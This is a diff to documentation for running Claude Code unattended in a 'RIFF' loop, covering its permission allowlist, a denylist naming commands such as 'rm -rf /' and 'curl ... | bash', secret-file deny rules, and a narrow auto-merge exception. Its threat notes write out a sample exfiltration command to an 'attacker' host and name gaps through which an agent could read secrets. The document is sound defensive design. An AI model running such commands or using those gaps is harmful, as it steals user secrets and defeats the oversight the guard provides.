@@ -13,7 +13,7 @@ The loop launches Claude Code with `--settings <path>/settings.afk.json` (replac
 - `defaultMode: dontAsk` — anything not on the allow list is auto-denied (no interactive prompt to skip past).
 - `disableBypassPermissionsMode: disable` — the `--dangerously-skip-permissions` flag is rejected at runtime even if accidentally re-introduced.
 - A curated **Bash allowlist** covering the standard RIFF flow: git, gh (read-only + `pr create`), npm/pnpm/yarn/bun, node/python/cargo/go, common file utilities, and the project's hook scripts.
-- A **Bash denylist** covering destruction (`rm -rf /`, `rm -rf ~`), privilege escalation (`sudo`, `chmod 777`), remote-fetch-and-execute (`curl ... | bash`), bash-syntax evasion (`eval`, `bash -c`, `base64 -d`), git history rewrite (`git push --force`, `git reset --hard`), supply-chain push (`npm publish`, `npm install -g`), privileged side-channels (`docker`, `kubectl`, `systemctl`, `ssh`), and auth tampering (`gh auth`, `gh secret`, `gh pr merge`).
+- A **Bash denylist** covering destruction (`rm -rf /`, `rm -rf ~`), privilege escalation (`sudo`, `chmod 777`), remote-fetch-and-execute (`curl ... | bash`), bash-syntax evasion (`eval`, `bash -c`, `base64 -d`), git history rewrite (`git push --force`, `git reset --hard`), supply-chain push (`npm publish`, `npm install -g`), privileged side-channels (`docker`, `kubectl`, `systemctl`, `ssh`), and auth tampering (`gh auth`, `gh secret`, `gh pr merge`). The `auto_merge` strategy uses a mirror settings file (`templates/settings.afk.auto-merge.json`) plus a mirror hook (`hooks/dangerous-command-guard.auto-merge.sh`) that surgically permits the single form `gh pr merge --auto --squash --delete-branch` and nothing else; all other `gh pr merge` shapes stay denied.
 - **Read/Edit/Write deny rules** scoped to user secrets and system files: `~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.config/gh`, `.env`, shell rc files, `/etc`, `/usr`, `/var`, `/bin`, `/sbin`.
 - `WebFetch` is denied wholesale. AFK phases that need web access should be marked `mode: HITL`.
 
@@ -56,7 +56,7 @@ Use the Docker sandbox when running RIFF on cloned external code, evaluating an 
 - **Reading sensitive data inside the project tree.** The project itself is mounted read-write; if a `.env` lives inside the repo, the model can read it via Bash (`cat .env` is denied by Read rules but `cat path/to/.env` from a different name is not). Don't put production secrets in your project tree.
 - **Outbound network exfiltration via allowed tools.** `curl` is in the allow list (needed for normal flow). A determined model could exfiltrate data via `curl https://attacker/?leak=$(cat secret)`. Layer 3 (Docker network policy) is the answer when this matters.
 - **Regression-introducing edits.** The guard checks safety, not correctness. The standard RIFF gates (security-reviewer, scope-checker, tests) catch correctness issues. AFK does not skip them.
-- **PR merging.** `gh pr merge` is denied. The loop opens PRs and stops. Auto-merge is a separate design (Phase 9 of `specs/plans/audit-fixes.md`).
+- **PR merging on the default strategy.** Under `git.merge_strategy: github_button` (default) and `local_no_ff`, `gh pr merge` is denied wholesale. The loop opens PRs and stops; a human merges. Under `git.merge_strategy: auto_merge`, the loop swaps to mirror settings + a mirror hook that permits exactly `gh pr merge --auto --squash --delete-branch`. Any other `gh pr merge` variant (including compound forms like `gh pr merge ... && rm -rf .`) is still blocked. Contract: `specs/designs/phase9-afk-chaining.md`.
 
 ## Operational notes
 
@@ -67,7 +67,9 @@ Use the Docker sandbox when running RIFF on cloned external code, evaluating an 
 
 ## See also
 
-- `templates/settings.afk.json` — the allowlist itself.
-- `hooks/dangerous-command-guard.sh` — the regex hook.
-- `riff-loop.sh` — the AFK loop integration point.
-- `specs/plans/audit-fixes.md` Phase 9 — auto-merge and merge-wait design (separate scope).
+- `templates/settings.afk.json` — the allowlist itself (default strategy).
+- `templates/settings.afk.auto-merge.json` — mirror allowlist used when `git.merge_strategy: auto_merge`.
+- `hooks/dangerous-command-guard.sh` — the regex hook (default strategy).
+- `hooks/dangerous-command-guard.auto-merge.sh` — mirror hook with the surgical carve-out for auto-merge.
+- `riff-loop.sh` — the AFK loop integration point; selects the right settings file per strategy.
+- `specs/designs/phase9-afk-chaining.md` — full chaining contract and threat reasoning.
